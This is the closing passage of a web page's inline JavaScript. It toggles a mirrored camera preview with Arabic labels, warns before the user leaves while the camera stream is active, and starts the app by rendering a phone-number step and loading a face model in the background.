    mirrorToggle.addEventListener('click', () => {
      previewMirror = !previewMirror;
      mirrorToggle.textContent = previewMirror ? 'عرض مرآة' : 'عرض طبيعي';
    });

    window.addEventListener('beforeunload', (e) => { if (mediaStream) { e.preventDefault(); e.returnValue = ''; } });

    /* Start app */
    renderPhoneStep();
    loadFaceModelSilently().catch(()=>{});
  </script>
</body>
</html>
